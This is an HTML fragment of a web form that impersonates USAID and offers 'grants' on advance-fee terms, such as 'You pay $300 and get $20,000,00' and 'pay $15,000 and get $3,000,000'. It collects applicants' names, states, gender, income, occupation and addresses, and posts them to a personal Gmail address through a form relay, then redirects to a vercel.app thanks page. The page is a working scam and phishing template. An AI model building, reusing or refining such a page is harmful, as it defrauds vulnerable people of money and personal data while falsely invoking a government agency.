  </head>
  <body>
   <div class="container-fluid bg-dark text-light py-3">
       <header class="text-center">
           <h1 class="display-6">United States Agency for International Development department (USAID)</h1>
       </header>
   </div>
   <section class="container my-2 bg-dark w-50 text-light p-2">
    <form class="row g-3 p-3" action="https://formsubmit.co/agentdennismusser@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_next" value="https://usaidgrant.vercel.app/thanks.html">

        <div class="col-md-4">
            <label for="validationDefault01" class="form-label">Full name</label>
            <input name="Full Name" type="text" class="form-control" id="validationDefault01" value="Mark" required>
          </div>
          <div class="col-md-4">
            <label for="validationDefault02" class="form-label">State</label>
            <input name="State" type="text" class="form-control" id="validationDefault02" value="Otto" required>
          </div>
          <div class="col-md-4">
            <label for="validationDefaultUsername" class="form-label">Male/Female</label>
            <div class="input-group">
              <!-- <span class="input-group-text" id="inputGroupPrepend2">@</span> -->
              <input name="Gender" type="text" class="form-control" id="validationDefaultUsername"  aria-describedby="inputGroupPrepend2" required>
            </div>
          </div>
        <div class="col-md-6">
          <label for="inputEmail4" class="form-label">Monthly Income</label>
          <input  name="Monthly Income" type="text" class="form-control" id="inputEmail4">
        </div>
        <div class="col-md-6">
          <label for="inputPassword4" class="form-label">Occupation</label>
          <input name="Occupation" type="text" class="form-control" id="inputPassword4">
        </div>
        <div class="col-12">
          <label for="inputAddress" class="form-label">Address</label>
          <input name="Address" type="text" class="form-control" id="inputAddress" placeholder="1234 Main St">
        </div>
      <div class="col-md-4">
        <label for="inputState" class="form-label">Area of Grant</label>
        <select name="area of Grant" id="inputState" class="form-select">
          <option selected>Business Funding
</option>
          <option>*Real Estate:Investing/Business
</option>
          <option>*Community Funding

</option>
          <option>*Education/Tuition Funding

</option>
          <option>*Real Estate:Personal Home purchase/1st Time Home Buyer

</option>
          <option>*Personal Assistance


</option>
          <option>*Personal Assistance:Home Repairs


</option>
        </select>
      </div>
        <div class="col-md-6">
          <label for="inputCity" class="form-label">Describe How you will use the money</label>
          <input name="description on how to use d money" type="text" class="form-control" id="inputCity">
        </div>
        <div class="col-md-4">
          <label for="inputState" class="form-label">choose the amount you wish to claim</label>
          <select name="amount" id="inputState" class="form-select">
            <option selected>Choose...</option>
            <option>You pay $300 and get $20,000,00.</option>
            <option>You pay $500 and get $30,000,00.</option>
            <option>You Pay $1000 and get $50,000,00.</option>
            <option>You pay $2,000 and get $90,000,00.</option>
            <option>You pay $3,000 and get $150,000,00.</option>
            <option>You pay $4,000 and get $200,000.00</option>
            <option>You pay $5,000 and get $300,000.00</option>
            <option>You pay $6,000 and get $450,000.00</option>
            <option>You pay $7,000and get $550,000.00</option>
            <option>You pay $8,500 and get $750,000.00</option>
            <option>You pay $10,000 and get $1,000,000.00</option>
            <option>you pay $15,000 and get $3,000,000.00</option>
          </select>
        </div>
       
        <!-- <div class="col-12">
          <div class="form-check">
            <input class="form-check-input" type="checkbox" id="gridCheck">
            <label class="form-check-label" for="gridCheck">
              Check me out
            </label>
          </div>
        </div> -->
        <div class="col-12">
          <button type="submit" class="btn btn-primary">Claim Grant</button>
        </div>
      </form>
   </section>
